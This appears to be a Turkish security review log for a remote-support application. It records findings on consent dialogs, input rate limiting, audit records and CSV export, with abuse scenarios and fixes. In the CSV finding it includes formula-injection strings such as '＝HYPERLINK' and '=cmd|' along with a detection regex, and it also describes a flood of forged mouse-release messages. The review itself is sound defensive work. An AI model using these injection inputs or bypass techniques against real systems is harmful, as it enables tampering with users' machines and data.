| S7-1 | KAPANDI | Sunucu `control.ts:157-180` `handleControlClose`: GRANTED/granting → önce bellek VIEW + epoch, misafire `control.release`, teknisyene `{VIEW,TECH}`, sonra REVOKED/TECH + `control.released` (`recordClose`). Açılış yazılırken bırakma `interrupt` ile dengeleniyor (`onGranted` 320-326). Go `flow/control.go:84-91` durumdan bağımsız `gate.Close()` + diyalog kapanışı, yanıt yok. Konsol `k.release_all` → `control.release`, "Kontrole devam" yeni istek. Uçtan uca zincir tutarlı. |
| S7-2 | KAPANDI | `onGranted` yalnız `REQUESTED && !granting` (`control.ts:279-285`); VIEW'da `control.revoke{stale}`, kayıt yok. `control.cancel` var; Go'da cancel sonrası gelen `EvControlGrant` `ctlReq.Pending()` şartıyla düşüyor (`flow/control.go:124`). Konsol beklenmeyen GRANTED'de yakalama başlatmıyor. Misafir başına `control.state` kotası eklenmedi; gerekçe kabul edildi (geçiş kuralları oturum başına ~10 consent satırıyla sınırlıyor, beklenmeyen mesaj kayıt üretmiyor, log dakikada 1). |
| S7-3 | KAPANDI (statik) — Windows elle doğrulama bekliyor (adım 37) | `host_windows.go:138-139` WM_HOTKEY → `gate.Shut`; `gate.go:51-62` Swap + goroutine, kilit yok. Kanca geri çağrıları yalnız atomik `Suspend` yazıyor; `Hooks()` yalnız `PostThreadMessage`. Host iş parçacığında `a.mu` veya `g.mu` alan yol yok, kilitlenme döngüsü kırılmış. Close sonrası garanti: `Handle` kapıyı `a.mu` altında, `Inject`'ten hemen önce `Allow` ile denetliyor. `Close` (UI/akış) `ReleaseAll` ile uçuştaki enjeksiyonu bekliyor, dönüşten sonra 0 olay. `Shut` dönüşünde en çok **bir** mesajlık parti (≤ 4 olay; Swap'tan önce `Allow`'u geçmiş) uygulanabilir, sonra `ReleaseAll` basılı kalanları bırakıyor. Yeni basma olayı yok, kabul edilebilir. Bkz. S7-16 (küçük sıra yarışı). |
| S7-4 | KAPANDI | `rooms.ts:167` ve `:180-181`: ADMITTED misafire önce `control.revoke{reconnect}`, sonra `peer.left/joined{tech}`; `monitorPending` temizleniyor. Go bilinmeyen `reason`'da `ParseServer` hatası → WS kapanışı → `cleanup` kapıyı kapatıyor (kapatma yönü fail-closed). |
| S7-5 | **AÇIK → S7-12 (Yüksek)** | Mekanizma doğru seçilmiş (olay bazlı `GetCurrentInputMessageSource`, bilinmezse enjekte sayma, dosya teklifi ortak `consentDlg`'de). Ancak sabit ters tanımlanmış, ayrıntı aşağıda. |
| S7-6 | KAPANDI (statik) — Windows adım 39 | Oturum penceresindeki düğme yalnız `present()` çağırıyor (imleç dışına yerleştirme, Reddet odağı, 1,5 sn kilidinin yeniden başlaması), izin vermiyor. |
| S7-7 | KAPANDI | LL kancaları `gate.OnOpen/OnClose` → `Hooks(on)`. `wmHooksOn` işlenirken `g.IsOpen()` tekrar denetleniyor (`host_windows.go:141`). Kısayol baştan kayıtlı (G-21 gerekçesi geçerli). |
| S7-8 | KAPANDI, kısmi atlatma → S7-13 | Kapalı kapıda ayrıştırmadan düşürme ve 250/sn, 500 patlama var. Bırakma muafiyeti sınırı atlatmak için kullanılabiliyor. |
| S7-9 | AÇIK (Düşük) — mimar kararı bekliyor | Go yalnız yerel kırmızı uyarı gösteriyor (oturum penceresi ve kontrol diyaloğu). Değerlendirme: müşteri bilgilendiriliyor ve izin yine müşteride, yerel uyarı Düşük için yeterli bir ara önlem. Teknisyene/audit'e görünürlük yok. Sapma 5'teki gerekçe doğru: `env.state` strict olduğu için alan eklemek 1008'e yol açar. Öneri (mimar): `env.state.selfElevated` (contracts + sunucu + konsol rozeti) ve GRANTED audit'inin `newValue`'una `selfElevated` yazılması. P10 prod açılışından önce karara bağlanmalı. GEÇTİ'yi engellemez. |
| S7-10 | KAPANDI | `ws.ts` `controlStateSchema.refine` (GRANTED yalnız UI; VIEW yalnız UI\|HOTKEY\|DENIED\|SYSTEM). Go tarafı da RECONNECT/TECH göndermiyor. |
| S7-11 | İZLEME | Kod değişmedi; implementation.md "P9/P10 için zorunlu not" doğru yazılmış. P9/P10 güvenlik turunda giriş şartı. |

### Yeni bulgular (öncelik sırasıyla)

#### S7-12 [YÜKSEK] `IMO_INJECTED` sabiti yanlış: enjekte girdi "yerel", donanım girdisi "enjekte" sayılıyor; G-03 enjekte tıklama koruması tersine çalışıyor — A04 Güvensiz Tasarım / A07
Yer: `apps/agent-win/internal/win/win_windows.go:325` (`const imoInjected = 0x01`) ve `:338` (`src.OriginID&imoInjected != 0`). Kullanan: `internal/ui/form_windows.go:141-151` (`track`), `control_windows.go:127` (`tryGrant`).
Kanıt: mingw-w64 `winuser.h` (Debian bookworm `mingw-w64-x86-64-dev`):
`IMO_UNAVAILABLE = 0x0, IMO_HARDWARE = 0x1, IMO_INJECTED = 0x2, IMO_SYSTEM = 0x4`. Koddaki 0x01 değeri **IMO_HARDWARE**'dir.
Sorun: Teknisyenin `SendInput` ile ürettiği tıklamada `OriginID = 2` olur. `2 & 1 == 0` olduğu için `injected=false, known=true` dönüyor ve tıklama yerel kullanıcı tıklaması sayılıyor. Müşterinin gerçek fare/klavye girdisinde ise `OriginID = 1` olduğu için girdi enjekte sayılıyor.
Etki ve istismar:
(1) **İşlevsel:** Gerçek Windows'ta müşteri kontrol izni, monitör izni ve dosya kabulü ("Kabul et") düğmelerinin hiçbirini kullanamaz (`tryGrant` hep reddeder). P7 kullanılamaz durumda. Dosya teklifi ortak diyaloğa taşındığı için P5'teki Go dosya kabulü de bozulmuş durumda (gerileme).
(2) **Güvenlik:** Kapı açıkken (ör. bu belirtiyi gidermek için kaynak denetimini gevşeten bir ara düzeltme ya da başka bir yoldan açılmış kapı) teknisyenin enjekte tıklaması monitör diyaloğunda "İzin ver"i ve dosya teklifinde "Kabul et"i (kendi gönderdiği `.exe` dahil) geçerli sayar. G-03'ün koruması tam tersine işliyor. Bugün kapı ilk kez açılamadığı için doğrudan istismar yolu kapalı, ancak kontrol mantığı ters. Windows elle testinde (adım 38) "hiçbir şey olmuyor" sonucu yanlışlıkla doğru yorumlanabilir.
Linux birim testleri bunu yakalayamıyor: sabit `windows` build etiketi altında ve sahte değerle test edilmiyor.
Düzeltme: `imoHardware = 0x01`, `imoInjected = 0x02`, `imoSystem = 0x04` sabitleri tanımlanmalı. Fail-closed kural: `injected = OriginID != imoHardware`. Yani yalnız IMO_HARDWARE yerel sayılmalı; INJECTED, SYSTEM ve bilinmeyen değerler enjekte sayılmalı. Not: UIAccess uygulamalarının enjeksiyonu da IMO_HARDWARE görünür, bu bilinen bir sınır olarak implementation.md'ye yazılmalı. Eşlemeyi platformdan bağımsız saf bir fonksiyona (`originInjected(id uint32) bool`) ayırıp her değer için birim testi eklenmeli. Windows adım 38 düzeltmeden sonra koşulmalı; ek olarak "müşterinin kendi tıklaması izin verir" adımı da doğrulanmalı. (atanan: backend-dev — Go)

#### S7-13 [DÜŞÜK] Bırakma muafiyeti hız sınırını atlatıyor: basılı olmayan düğme için `m.btn{down:false}` her seferinde fare hareketi + düğme bırakma enjekte ediyor — A04 (DoS)
Yer: `apps/agent-win/internal/input/applier.go:123` (`!isRelease(m) && !a.takeLocked`), `:139` (`isRelease` yalnız `down=false`'a bakıyor), `:185-195` (`translate` `m.btn` dalı, düğme basılı olmasa da `[mv, up]` döndürüyor).
İstismar senaryosu: Değiştirilmiş konsol, kapı açıkken saniyede binlerce `{"t":"m.btn","b":"l","down":false,"x":..,"y":..}` gönderiyor. Her mesaj jeton harcamadan mutlak fare hareketi ve eşleşmeyen bir LBUTTONUP enjekte ediyor. 250/sn sınırı (S7-8) fiilen devre dışı kalıyor; müşteri CPU'su ve girdi kuyruğu doluyor. `k{down:false}` için risk yok: basılı olmayan tuş `key()` içinde `nil` dönüyor. Yerel öncelik (AC-104) ve kısayol çalışmaya devam ettiği için etki Düşük.
Düzeltme: Yalnız **basılı** bir düğme veya tuşun bırakılması muaf tutulmalı (`a.buttons[m.B]` / `a.keys[m.Code]`). Diğer bırakma mesajları jeton harcamalı. Basılı olmayan düğme için bırakma olayı enjekte edilmemeli, en fazla hareket enjekte edilmeli (o da sınırdan geçerek). `TestS78InputRateLimit`'e bu senaryo eklenmeli. (backend-dev — Go)

#### S7-14 [DÜŞÜK] `thread.cur` mesaj gönderimi bittikten sonra sıfırlanmıyor; sonraki `GetMessage` içinde teslim edilen çapraz iş parçacığı `BM_CLICK`'i önceki yerel tıklamanın işaretini görüyor — A04
Yer: `apps/agent-win/internal/ui/form_windows.go:110-125` (`loop`: `track` her mesajın başında `t.cur`'u yazıyor, `TranslateDispatch`'ten sonra sıfırlamıyor), `:157` (`userInput`).
Sorun: Gönderilen (sent) mesajlar `GetMessage` içinde, `track` çalışmadan önce işlenir. Müşteri diyaloğun herhangi bir yerine yerel tıkladıktan hemen sonra aynı masaüstündeki başka bir süreç "İzin ver"e `SendMessage(BM_CLICK)` gönderirse `userInput` true döner. Teknisyen pencere mesajı gönderemediği için (yalnız `SendInput`) tehdit yalnız yerel kötü amaçlı yazılım. Bu da kapsam dışı sayılabilir. Yine de "girdi mesajı işlenmiyorsa false" yorumu bu durumda doğru değil.
Düzeltme: `IsDialogMessage`/`TranslateDispatch` döndükten sonra `t.cur = inputMark{}` yapılmalı. (backend-dev — Go)

#### S7-15 [DÜŞÜK] Misafir kopmasında bekleyen monitör isteği temizlenmiyor; yeniden bağlanan istemcinin `share.state`'i sahte `monitor.granted` yazdırabiliyor — A09
Yer: `apps/server/src/signaling/control.ts:383-389` (`resetOnGuestGone`, `monitorPending`'e dokunmuyor), `:245-253` (`onShareMonitor`).
Sorun: Teknisyen 2 numaralı monitörü istiyor, istemci kopuyor ve 30 sn içinde yeniden bağlanıyor. Yeni istemci diyalog göstermeden ilk `share.state`'ini gönderiyor. `activeMonitor` bekleyen kimlikle aynıysa (ör. istemcinin seçtiği varsayılan monitör o ise) müşteri onayı olmadığı hâlde audit'e `monitor.granted` yazılıyor. Ayrıca teknisyen 30 sn boyunca `CONFLICT`, ardından 30 sn `RATE_LIMITED` alıyor. Aynı kimlik zaten etkin olan monitör istendiğinde de benzer sahte kayıt oluşuyor. Monitör değişimini sahte bildirmek için tek başına bir kontrol açılmıyor; etki zaman çizelgesi bütünlüğüyle sınırlı.
Düzeltme: `resetOnGuestGone`'da `monitorPending = undefined` yapılmalı (teknisyen tarafında K3'te zaten yapılıyor). `handleMonitorRequest` `share.activeMonitor === monitorId` için istek açmamalı (no-op / VALIDATION). (backend-dev)

#### S7-16 [DÜŞÜK] `Shut` dinleyicileri goroutine'de çalıştığından gecikmiş `Hooks(false)`, hemen ardından açılan kapının kancalarını kaldırabiliyor — A04 (AC-104)
Yer: `apps/agent-win/internal/control/gate.go:51-62`, `internal/input/host_windows.go:149-150` (`wmHooksOff` kapı durumuna bakmıyor).
Sorun: Kısayolla kapatma → goroutine zamanlanmadan önce yeniden `Open` → `HooksOn`, ardından geç gelen `HooksOff`. Sonuçta kapı açık, kancalar yok: yerel öncelik çalışmaz. Kapı ve kısayol etkilenmez. Pratikte yeni istek ve 1,5 sn kilidi gerektiği için olasılık çok düşük.
Düzeltme: `wmHooksOff` işlenirken `if !g.IsOpen() { unhook() }` denetimi yapılmalı (`wmHooksOn`'daki desenin simetriği). (backend-dev — Go)

### Yeni yüzeylerin incelemesi (bulgu yok)
- **release/cancel yarışları:** `handleControlClose` kuyruğa alınmıyor ama bellekte eşzamanlı çalışıyor. Kuyrukta bekleyen `onGranted` VIEW gördüğünde `revoke{stale}` gönderiyor. İstek audit'i sürerken gelen iptal epoch ile `superseded` ediliyor, müşteriye geç istek gitmiyor. Go tarafında `ctlReq.Pending()` şartı geç `EvControlGrant`'i düşürüyor; olay sırası tersse kapı açılıp hemen kapanıyor ve sunucu `stale` ile tutarlı kalıyor.
- **Consent dengeleme satırları:** `recordClose` → granting ise `interrupt ??=` (ilk kapatma kazanıyor). `onGranted` commit sonrası epoch farkında `interrupt` ile REVOKED yazıyor. Zaman aşımında geç commit `balance` ile dengeleniyor. Hata (rollback) yolunda dengeleme gerekmiyor. Her GRANTED satırına tam bir kapanış düşüyor. `closeControlOnEnd` `session.ended` sonrası yazıyor ve beklenmiyor (K5-d).
- **`monitor.denied` sahteciliği:** Yalnız AGENT ve yalnız bekleyen kimlikle kabul ediliyor. Müşteri zaten reddedebileceği için yeni yetki doğmuyor. Kayıt bekleyen istek sayısıyla sınırlı (≤ 5). Teknisyenden gelen `monitor.denied` şemada yok, 1008.
- **CONFLICT kuralı:** REQUESTED'de ikinci istek ve bekleyen monitör isteğinde yeni istek `CONFLICT`. Sayaç sızdırmıyor, bilgi sızıntısı yok.
- **Açılış penceresi (bilgi):** Go kapıyı `GRANTED` göndermeden önce açıyor. Sunucu kaydı 800 ms içinde yazılamazsa `revoke{audit}`. Bu sürede kayıt olmadan girdi uygulanabilir. ADR-0009/G-15 gereği kabul edilmiş tasarım; konsol GRANTED onayı gelmeden girdi göndermiyor.

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found** (2026-11-11).
- govulncheck v1.1.4, `golang:1.26.11-bookworm`, DB 2026-11-11 (`apps/agent-win`):
  - linux: "Your code is affected by 0 vulnerabilities", exit 0.
  - `GOOS=windows GOARCH=amd64`: "Your code is affected by 0 vulnerabilities", exit 0.
  - Gereken modüllerde çağrılmayan 3 kayıt var: GO-2026-6866 ve GO-2026-6860 (`golang.org/x/net@v0.60.0`, düzeltme v0.62.0), GO-2026-5932 (`golang.org/x/crypto@v0.57.0`, düzeltme pseudo-version). Kod bu sembolleri çağırmıyor. Dependabot ile yükseltilmesi önerilir (Bilgi).
- Gizli bilgi (`git grep` kalıbı; izlenen ve izlenmeyen P7 dosyaları): eşleşme yok. Git geçmişinde yalnız `.env.example` var.

### Tasarımda vaat edilip kodda bulunmayanlar
- G-03 "enjekte tıklamayla izin verilemez": mekanizma var, sabit yanlış (S7-12).
- Tur 1 listesindeki K1–K5, `monitor.denied`, oturum sonu kapanış satırı, teknisyen kopmasında monitör temizliği ve ADR-0013 dosyası: **tamamlandı**. Misafir kopmasında monitör temizliği eksik (S7-15).

### Windows elle doğrulama bekleyenler (GEÇTİ'yi engellemez; S7-12 düzeltildikten sonra)
Adım 37 (S7-3: sürekli hareket altında kısayol, takılma yok, AC-104 sonrası kanca hâlâ etkin), 38 (S7-5/S7-12: teknisyen enjekte tıklaması ve Alt+İ izin vermez, **müşterinin kendi tıklaması izin verir**; dosya kabulünde de aynısı), 39 (S7-6), 40 (S7-7), 42 (S7-9 uyarısı).

### Olumlu
- Kapatma yönü her katmanda DB'den bağımsız ve iki katmanlı (sunucu revoke + istemci `peer.*`/`hello`/kopma). Yeni mesajların hiçbiri kapıyı açamıyor.
- Host iş parçacığı kilitsiz; kilit sırası yorumla ve `TestS73HotkeyOnHookThreadDoesNotDeadlockWithSendInput` ile güvenceye alınmış.
- Kancalar artık yalnız kontrol açıkken kurulu; global "son basış" bayrağı kaldırılmış.
- Misafir şeması sunucu kaynaklarını reddediyor (1008). Fixture'lar iki dilde ortak.

### Ajan bazında
- backend-dev (Go): **S7-12 (zorunlu)**, S7-13, S7-14, S7-16.
- backend-dev (sunucu): S7-15.
- mimar: S7-9 kararı (`env.state.selfElevated` + audit).

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
S7-13, S7-14, S7-15, S7-16 ve S7-9 (mimar kararı) "Sonra" listesine alınabilir. Go `x/net`/`x/crypto` yükseltmesi Dependabot ile yapılabilir.

DURUM: DÜZELTİLMELİ (Yüksek 1: S7-12 — `IMO_INJECTED` sabiti; düzeltme tek satır + birim testi)

---

## P7 — Tur 3 — S7-12..S7-16 kapanışı + K6/K8 (2026-11-11)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0 (yeni). S7-12 (Yüksek) kapandı. S7-11 izlemede. Windows elle doğrulama bekleyenler aşağıda listelendi.

Kapsam: Tur 2'den sonra değişen yerler: `apps/agent-win/internal/{control/{origin,gate}.go, win/win_windows.go, ui/form_windows.go, input/{applier,host_windows}.go, flow/{control,flow}.go, signal/messages.go}`, `cmd/noktadestek/main.go`, `apps/server/src/signaling/{control,types}.ts`, `packages/contracts/src/ws.ts` + fixtures, `apps/web/lib/control/machine.ts`, `components/console/{stage,control-button}.tsx`. Ölçüt: `docs/mimari-protokol.md` §3.3 K6–K8, "P7 Tur 2 kararları", ADR-0013 "Ek — P7 Tur 2". `go.mod`/`go.sum`/`pnpm-lock.yaml` HEAD'e göre değişmemiş. Bu yüzden govulncheck/audit tekrar koşulmadı, Tur 2 sonucu geçerli.

### Tur 2 maddelerinin durumu
| ID | Durum | Kanıt / not |
|---|---|---|
| S7-12 [YÜKSEK] | **KAPANDI** (statik). Windows adım 38 bekliyor | `internal/control/origin.go:6-9`: `IMO_UNAVAILABLE=0, IMO_HARDWARE=1, IMO_INJECTED=2, IMO_SYSTEM=4`, winuser.h ile birebir. `OriginInjected` (`:16-18`) `!ok \|\| origin != IMO_HARDWARE` döndürüyor, yani fail-closed: yalnız başarılı sorguda donanım girdisi yerel sayılıyor; birleşik ve bilinmeyen değerler (8, 1\|2, 0xFFFFFFFF) enjekte. `CharInjected` (`:23-28`) WM_(SYS)CHAR kaynağı bilinmiyorsa onu üreten WM_(SYS)KEYDOWN kararını kullanıyor, o karar da fail-closed. TranslateMessage karakteri tuş basışıyla aynı hwnd'ye gönderdiği için bayat bir karar devralınmıyor. Çağrı yolu: `form_windows.go:146-162` `track` → `userInput` (`:166`) → `control_windows.go:126-127` `tryGrant`. Kontrol, monitör ve dosya diyaloglarının üçü de `newConsent` ile aynı `consentDlg`'yi kullanıyor. Alt+İ yolu `WM_SYSCHAR` → `CharInjected`. Grep: `imoInjected`/`InputInjected` repoda yok. `win.InputOrigin` (`win_windows.go:327`) yalnız ham değeri döndürüyor ve tek çağıranı `track`. Birim test: `TestS712OriginInjectedFailClosed`, `TestS712CharInjected` (platformdan bağımsız, linux CI'da da koşuyor). |
| S7-12 UIAccess sınırı | Kabul edildi (bilgi) | UIAccess'li bir sürecin `SendInput`'u IMO_HARDWARE görünüyor. Bu yol imzalı ve güvenli konumda (Program Files/System32) kurulu yerel bir uygulama gerektiriyor. Teknisyenin elinde yalnız istemcinin `SendInput`'u var (INJECTED). Tehdit modeli dışında. `origin.go:15` ve implementation.md "Kararlar 1"de yazılı. Yerel kötü amaçlı yazılım zaten müşteri oturumunda istediğini yapabilir. |
| S7-13 | KAPANDI | `applier.go:139-152` `heldReleaseLocked`: hız sınırından yalnız `a.keys`/`a.buttons`'ta gerçekten basılı olanın bırakılması muaf. `translate` (`m.btn`, `:200-204`) basılı olmayan düğmeyi bırakmayı no-op yapıyor, hareket de enjekte edilmiyor. Muafiyet her basış için bir kez kullanılabiliyor (enjeksiyon kaydı siliyor), basış da jeton harcıyor. Askıdayken (AC-104) muaf bırakmalar `Allow`'da düşüyor ve enjekte edilmiyor, yük yalnız ayrıştırma. `TestS713ReleaseExemptionOnlyForHeld` yeşil. |
| S7-14 | KAPANDI (statik) | `form_windows.go:116-124`: `track` → `handle` → `t.cur = inputMark{}`. Sonraki `GetMessage` içinde teslim edilen gönderilmiş BM_CLICK işaretsiz kalıyor, `userInput` false. Win32 döngüsü olduğu için birim testi yok, kabul edilebilir. |
| S7-15 | KAPANDI | `control.ts:406-408` `resetOnGuestGone` her kopmada `monitorPending` ve `guestEnv`'i temizliyor. `onShareMonitor` (`:252-253`) yalnız `guest.peer === monitorPending.peer` ise karşılıyor. `handleMonitorRequest` (`:194`) etkin monitör için `VALIDATION` döndürüyor ve sayaç düşmüyor. İletim `pending.peer`'e yapılıyor, süpersede koşulu bağlantı değişimini de kapsıyor (`:204`). Ek kontrol: WS açıkken PC kopması (K6) monitör diyaloğunu mesajsız kapatıyor, `monitorPending.peer` aynı kalıyor. Go istemci monitörü yalnız ilk `hello`'da seçiyor (`flow.go:487-507`), sonrasında yalnız onaylı `monitor.request` ile değiştiriyor (`control.go:165-198`). Yeniden kurulan PC'nin `share.state`'i bekleyen kimliği bildiremez, sahte `monitor.granted` yolu yok. |
| S7-16 | KAPANDI (statik). Windows adım 37 bekliyor | `gate.go`: `state = nesil<<1\|açık` tek atomik değerde, CAS ile tutuluyor. `Shut` kapanan neslin değerini goroutine'deki dinleyiciye veriyor. `host_windows.go:149-154` `wmHooksOff` kancayı yalnız `StillClosed(gen)` ise kaldırıyor. wParam okuması amd64 MSG düzeniyle uyumlu (`msg[16]`). Bayat kaldırma yok sayılıyor. Kapanmamış kanca yalnız AC-104 askısını tetikleyebilir, bu da güvenli yöndedir. `TestS716StaleHooksOffIgnoredAfterReopen` ve `TestS716GenerationRaceFree` -race altında yeşil. |
| S7-9 | KAPANDI (K8) | Aşağıda K8 maddesi. |
| S7-11 | İZLEME | Değişmedi. P9/P10 güvenlik turunda giriş şartı. |

### Mimar kararlarının (K6–K8) güvenlik incelemesi
- **K6 (`onView`, `control.ts:358-372`)** — REQUESTED durumunda gelen `{VIEW, UI\|HOTKEY\|SYSTEM}` isteği iptal ediyor. Consent yazılmıyor, `deniedAt` başlamıyor, `requests` geri verilmiyor. Kötüye kullanım değerlendirmesi:
  - *Sayaç/cooldown atlatma:* Mesajı yalnız misafir (AGENT) gönderebiliyor. Teknisyen şemasında `control.state` yok, gelirse 1008. Bekleme olmaması yalnız teknisyenin lehine. Misafir bunu istese de zaten "Reddet" ile aynı sonucu alabiliyor. Teknisyenin 5 istek kotası her iki yolda da harcanıyor. Yeni yetki doğmuyor.
  - *Audit şişirme:* `control.cancelled{by:"agent"}` yalnız `state === "REQUESTED"` iken yazılıyor. Her satır teknisyenin başlattığı bir `control.requested`'e karşılık geliyor; kota oturum başına ≤ 5. VIEW'da tekrar gelen mesaj `:356` ile kayıt üretmiyor. Sınırlı.
  - *Yarış:* `onView` `enqueue` ile `onGranted` ile sıralı çalışıyor. `granting` iken iptal araya giremiyor. Geç gelen `VIEW/SYSTEM`'in yeni isteği kapatması kapatma yönünde ve mimarca kabul edildi (reqId genişleme noktası).
  - *Ret izinin silinmesi (bilgi):* Kötü niyetli ya da değiştirilmiş bir istemci DENIED yerine `VIEW/UI` göndererek consent'e "ret" düşmeden isteği kapatabiliyor. Audit'te `by:"agent", source:"UI"` olarak ayrı ve izlenebilir şekilde kalıyor. Gerçek Go istemcisi yalnız `SYSTEM` gönderiyor. Etki yok, bulgu açılmadı. İstenirse P8 zaman çizelgesinde `source≠SYSTEM` olan iptaller "beklenmeyen" diye işaretlenebilir (öneri).
- **K8 `selfElevated`** — `ws.ts:144` `z.strictObject` içinde `z.boolean()` zorunlu. Eksik ya da null değer 1008 alıyor (contracts testi ve entegrasyon testi var). Sunucu alanları yeniden kurarak iletiyor (`handleEnvState`, `:270`), tarayıcı misafirinden gelen değeri yok sayıyor. Audit değeri yalnız `"true"\|"false"\|"unknown"` sabitlerinden üretiliyor (`:276`). İstemci kaynaklı serbest metin yok. Go: `messages.go:224` `json:"selfElevated"`, `omitempty` yok. Değer `env.SelfElevated()` (`TokenElevation`) ile açılışta bir kez ölçülüyor. Değer istemcinin beyanı ve değiştirilmiş bir istemci yalan söyleyebilir. Bu bilgilendirme amaçlı bir alan, kontrol kararı buna dayanmıyor. Kabul edildi.
- **VALIDATION kuralı** — Etkin monitör için `VALIDATION` dönülüyor. Hata yalnız isteyen teknisyene gidiyor ve teknisyen etkin monitörü zaten görüyor, bilgi sızıntısı yok. Sayaç ve metrik tutarlı.
- **Konsol** — Rozet yalnız boolean `control.selfElevated` ile koşullanıyor ve metin i18n'den geliyor (`stage.tsx:169-173`), XSS yüzeyi yok. CONFLICT `notice` olarak sunucu metnini React metin düğümünde gösteriyor (`control-button.tsx:83,106`). Değişen dosyalarda `dangerouslySetInnerHTML` yok. Monitör kilidi (`canRequestMonitor`, `MONITOR_BLOCK_MS`) yalnız arayüz kolaylığı. Yetkili karar sunucuda (`handleMonitorRequest` CONFLICT/RATE_LIMITED/VALIDATION). Kontrol isteğine gelen VALIDATION yok sayılıyor ve faz değişmiyor.

### Yeni bulgular
Yok.

### Otomatik tarama / test çıktıları (2026-11-11)
- Go (`golang:1.26.11-bookworm`, `apps/agent-win`): `gofmt -l .` boş. `go vet ./...` ve `GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go vet ./...` temiz (VET_OK). `go test -race -count=1 ./...` sonucunda **15/15 paket ok**.
- `pnpm --filter @remote/server test`: **12 dosya / 244 test** yeşil. `pnpm --filter @remote/contracts test`: **4 dosya / 43 test** yeşil.
- Bağımlılık: `git diff HEAD -- apps/agent-win/go.mod apps/agent-win/go.sum pnpm-lock.yaml` boş. govulncheck ve pnpm audit Tur 2'de temiz çıkmıştı (3 çağrılmayan x/net ve x/crypto kaydı, Dependabot).
- Gizli bilgi kalıbı (`git grep` + izlenmeyen P7 dizinleri): eşleşme yok.
- Entegrasyon testleri (`test:int`, MySQL) bu turda koşulmadı. Backend raporu: 23 dosya / 186 test yeşil.

### Tasarımda vaat edilip kodda bulunmayanlar
Yok. G-03 enjekte girdi koruması, K6, K7, K8 ve S7-15 temizliği kodda karşılığını buldu.

### Windows elle doğrulama bekliyor (GEÇTİ'yi engellemez; `docs/gereksinimler.md` "Sonra / açık — P7'den")
- Adım 37: kısayol ve ardından hemen yeniden izin (S7-16). Kancalar kurulu kalmalı, AC-104 yerel öncelik çalışmalı.
- Adım 38: S7-12. Üç diyalogda (kontrol, monitör, dosya) müşterinin gerçek tıklaması ve Alt+İ ile **izin verilebilmeli**, teknisyenin `SendInput` tıklaması ve Alt+İ'si **izin verememeli**.
- Adım 39, 40.
- Adım 42: yönetici olarak açılışta konsol rozeti ve GRANTED audit'inde `selfElevated:"true"`.
Adım 38 gerçek Windows'ta başarısız olursa (ör. müşteri tıklaması reddedilirse ya da enjekte tıklama kabul edilirse) G-03 açık sayılır ve **Yüksek** olarak yeniden açılır.

### Olumlu
- Kaynak kararı Win32'den ayrılmış saf bir fonksiyonda tutuluyor ve her sabit için test var. Tur 2'deki türden bir hata artık linux CI'da yakalanıyor.
- Kapı durumu ve nesli tek atomik değerde tutuluyor. Kilitsiz tasarım korunmuş.
- K6/K8 sözleşmesi contracts, sunucu, Go ve konsolda tutarlı ve ortak fixture ile iki dilde test ediliyor.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
- P8 zaman çizelgesinde `control.cancelled{by:"agent"}` kayıtlarından `source≠SYSTEM` olanlar "beklenmeyen istemci davranışı" olarak işaretlenebilir (bilgi).
- Go `x/net`/`x/crypto` yükseltmesi Dependabot ile yapılabilir (Tur 2'den taşınan madde).

DURUM: GEÇTİ (Kritik 0 / Yüksek 0; S7-12..S7-16 ve S7-9 kapandı; Windows adım 37/38/42 elle doğrulama bekliyor)

---

## P8 — Tur 1 — Oturum geçmişi (2026-11-11)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 4

Kapsam: commit edilmemiş P8 değişiklikleri. Sunucu tarafında `src/sessions/{service,history,history-repo,routes,repo}.ts`, `lib/csv.ts`, `audit/mask.ts`, `auth/guards.ts` (`requireAnyPerm`), `signaling/admit.ts` ve `public/service.ts`. Contracts tarafında `api/sessions.ts` ve `labels.ts`. Ayrıca migration'lar `20261111060000_p8_session_history` ile `20261111070000_enum_check_binary` (ADR-0014, precheck), web `app/(panel)/history/**` ile `lib/history/*` ve Go `internal/capture/cursor.go` ile `dxgi_windows.go`.

### Bulgular (öncelik sırasıyla)

#### S8-1 [DÜŞÜK] CSV formül kaçışı yalnız ilk karaktere bakıyor (A03 Injection, CSV/formula injection)
Yer: `apps/server/src/lib/csv.ts:9` (`FORMULA_START = /^[=+\-@\t\r]/`)
Sorun: AC-124'teki = + - @ TAB CR karakterlerinin tamamı kapsanıyor. `;` ve `"` RFC 4180'e göre doğru tırnaklanıyor (`NEEDS_QUOTES`). Kapsanmayan iki durum var. Birincisi baştaki boşluk/NBSP ile başlayan değerler: `note` kırpılmıyor, örneğin `"  =HYPERLINK(...)"`. İkincisi tam genişlikli `＝ ＋ － ＠` varyantları. Ad ve ticket alanı JS `trim()` ile kırpıldığı için birincisi bu alanlarda oluşmaz, ikincisi oluşabilir. Bazı tablolama yazılımları ve içe aktarma ayarları baştaki boşluğu atıp hücreyi formül olarak değerlendirebiliyor. Excel'in varsayılan açılışında bu davranış doğrulanmadı.
İstismar senaryosu: Müşteri katılım formunda adını `＝HYPERLINK("http://…","tıkla")` girer, ya da kötü niyetli bir teknisyen notu `" =cmd|…"` olarak yazar. Yönetici CSV'yi formül değerlendiren bir ayarla açtığında hücre çalışır. Kullanıcı etkileşimi ve özel ayar gerektiği için önem Düşük.
Düzeltme: Kontrol baştaki boşlukları atlasın ve tam genişlikli varyantları da kapsasın: `/^[\s 　]*[=+\-@\t\r＝＋－＠]/`. Birim testine her varyant için birer örnek eklenmeli. Atanan: backend-dev

#### S8-2 [DÜŞÜK] Liste yanıtı bekleyen oturumların katılım kodunu (`code`) taşıyor (A01/A04, veri en aza indirme)
Yer: `apps/server/src/sessions/history.ts:72` (`toListItem` → `toView`) ve `apps/server/src/sessions/service.ts:47` (`code: status==="PENDING" ? activeCode : null`)
Sorun: P8'de `GET /sessions` geçmiş ekranının da ucu oldu (`sessions.view` VEYA `session_history.view`). Firma seçmemiş SUPER_ADMIN için kapsam artık tüm tenant'lar. Bu yüzden PENDING durumdaki her oturumun 8 haneli katılım kodu, geçmiş listesi için gerekmediği halde, daha geniş bir kitleye dönüyor: ADMIN'e tenant'taki diğer teknisyenlerin kodları, SA'ya bütün tenant'ların kodları gidiyor. `techVerifyCode` zaten müşteriye gösterilen bir değer (G-01), sır sayılmaz.
